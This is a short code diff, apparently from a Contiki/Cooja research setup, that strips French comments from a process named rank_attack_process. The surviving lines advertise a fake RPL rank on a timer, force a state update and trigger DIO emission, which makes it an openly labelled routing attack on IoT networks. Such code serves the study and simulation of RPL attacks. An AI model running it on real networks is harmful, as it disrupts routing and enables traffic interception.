@@ -19,7 +19,6 @@ PROCESS_THREAD(rank_attack_process, ev, data)
   while(1) {
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
 
-    /* Obtenir le DAG courant */
     rpl_dag_t *dag = rpl_get_any_dag();
     if(dag != NULL) {
 
@@ -28,13 +27,10 @@ PROCESS_THREAD(rank_attack_process, ev, data)
       printf("Rank Attack: Mote %u advertising fake rank %u\n",
              (unsigned)linkaddr_node_addr.u8[0], fake_rank);
 
-      /* Manipulation directe du DAG (attaque) */
       dag->rank = fake_rank;
 
-      /* Mise à jour RPL interne (sans argument) */
       rpl_dag_update_state();
 
-      /* Forcer une émission immédiate de DIO */
       rpl_timers_schedule_state_update();    }
 
     etimer_reset(&timer);
